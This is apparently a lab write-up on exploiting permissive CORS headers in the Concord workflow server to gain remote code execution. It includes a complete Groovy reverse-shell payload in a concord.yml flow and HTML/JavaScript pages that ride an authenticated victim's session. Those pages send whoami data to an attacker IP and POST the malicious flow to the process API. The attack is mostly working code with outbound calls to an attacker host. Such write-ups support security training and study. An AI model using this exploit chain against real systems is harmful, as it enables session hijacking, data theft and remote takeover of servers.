## Reading the Documentation

Now that we have understood what the vulnerability is, and we have found a potential vector, we can start our research on what we can/can't do and how can we exploit.

CORS exploits are similar to reflected _Cross-Site Scripting_ (XSS) in that we must send a link to an already-authenticated user in order to exploit something of value.
The difference with CORS is that the link we send will not be on the same domain as the site we are targeting.
Since Concord has some permissive CORS headers, any site that an authenticated user visits can interact with Concord and ride the user's session.
Thus, we will host our own site. A site that will host a JavaScript payload that will run in the victim's browser and interact with Concord(riding the user's session).

Now, even though we understand how to exploit this vulnerability, we need to understand how can we specifically exploit concord.
Thus, we need to find a special request that can we can get executed from the user's session, that either elevates our privileges, or allows us to obtain sensitive information.
For this, we will move on to the concord API's documentation.
Moreover, because the concord CORS headers, have some restrictions, we need to be selective with what types of requests we search for.

There are only 3 types of requests we can work with:
1. GET request that obtains sensitive information.
2. GET request that changes the state of the application.
3. POST request that only uses standard content-types.

For example, the first section that catches our eye is the API key section.
Here, we see the request /api/v1/apikey.
This looks interesting as it creates a new API key for a user, this might seem interesting until we notice that the POST request uses application/json content-type, which means, before sending the request it will send an OPTIONS method request, which replies with different CORS headers that are not as vulnerable:

Moving on, further reading the documentation, we land on the process section.
Here, we see an endpoint to "Start a Process".
A process in concord, is the execution of a flow in a repo, of a project.
This might lead to code execution, and thus we can start inspecting more.

The request is a standard POST request, which requires the "multipart/form-data" content-type, which is a standard content-type and does not require a preflight check.
We don't have to worry about the authentication, as even though concord could authenticate requests solely with an _Authorization_ header, most modern graphical sites coded for browser-based clients use cookies for authentication.
In addition, since the server sent the _Access-Control-Allow-Credentials_ header, we can assume that cookies are used for session management.

Reading the documentation further, we see how we can start a concord process by uploading a ZIP file.
The documentation explains, how we can create a zip archive with a concord.yml file that contains a "flow". Concord describes a flow as a "series of steps executing various actions":

Further in the documentation, it even states that we don't even need to provide a ZIP file, and can just provide the concord.yml file to get the process running:

![](../../03.%20Screenshots/t8-ss20.png)

The documentation says "The format is described in Directory Structure document."
Thus, we can visit the URL to the directory structure, to study potential paths to code execution.

The document defines a concord.yml file as "a Concord DSL file containing the main flow, configuration, profiles and other declarations"
and a DSL as "Concord DSL files contain configuration, flows, profiles and other declarations."

Finally, we can try and understand what a flow is. which seems to be our most likeable command execution vector.
Studying further, on how we can set up a flow, we can see the groovy script example, in the "Scripting" section:

![](../../03.%20Screenshots/t8-ss21.png)

The script, first imports the groovy dependency, then sets the script variable to groovy. This will instruct concord to execute the command as groovy.
With that setup, we can finally add the main body, and set it as a basic reverse shell. Our final concord.yml file will look like so:

```groovy
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "<kali IP}>";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
```

With the script ready, we need to create a website that our victim will visit who's session we will ride.
The website code will look like so:

```html
<html>
	<head>
		<script>
			fetch("http://concord:8001/api/service/console/whoami", {
				credentials: 'include'
			})
			.then(async (response) => {
			if(response.status != 401){
				let data = await response.text();
				fetch("http://192.168.118.2/?msg=" + data )
			}else{
				fetch("http://192.168.118.2/?msg=UserNotLoggedIn" )
			}
			})
		</script>
	</head>
	<body>
	</body>
</html>
```

The code will first check if the user is logged in.
If the response status is not 401(meaning the user is logged in), the captured data will be sent back.
However, if the user is not logged in meaning a 401 status response, a message will be sent back to the kali server saying that the user is not logged in.

We can save the html file, and host a python http server and send the link to our victim, and wait for a response.
To make sure the webpage is working, we will visit the attacker IP, and expect a UserNotLoggedIn message to the kali server:

![](../../03.%20Screenshots/t8-ss22.png)

Now, we wait for an authenticated victim to visit our webpage:

![](../../03.%20Screenshots/t8-ss23.png)

We see that our exploit is working correctly.
Now all we need to do is, include our groovy script, as a file, inside the request we're sending riding the user's session:

```html
<html>
<head>
	<script>
		yml = `
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.119.155";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
`         
		fetch("http://concord:8001/api/service/console/whoami", {
				credentials: 'include'
		})
			.then(async (response) => {
			if(response.status != 401){
				let data = await response.text();
				fetch("http://192.168.119.155/?msg=" + data )
				rce();
			}
			else{
				fetch("http://192.168.119.155/?msg=UserNotLoggedIn" )
			}
		})
		function rce() {
			var ymlBlob = new Blob([yml], { type: "application/yml" });
			var fd = new FormData();
			fd.append('concord.yml', ymlBlob);
			fetch("http://concord:8001/api/v1/process", {
			    credentials: 'include',
				method: 'POST',
			    body: fd
			})
				.then(response => response.text())
				.then(data => {
			    	fetch("http://192.168.119.155/?msg=" + data )
				}).catch(err => {
			    	fetch("http://192.168.119.155/?err=" + err )
				});
			}
		</script>
</head>
<body>
</body>
</html>
```

We'll first add our groovy script in a "yml" variable.
Then, we define the function "rce", that will start by creating a blob from the yml string, with the content-type "application/yml".
Next, we create the form-data for fetch, we append that, to the end of the concord.yml document.
We use fetch, to make the actual request, and deal with responses and catch any errors.
Finally, we call the function, in the ".then" promise, where the user is logged into the application.

With the payload ready, we can setup a listener to catch the reverse shell, and wait for the victim to visit our link. Finally, we get the reverse shell:
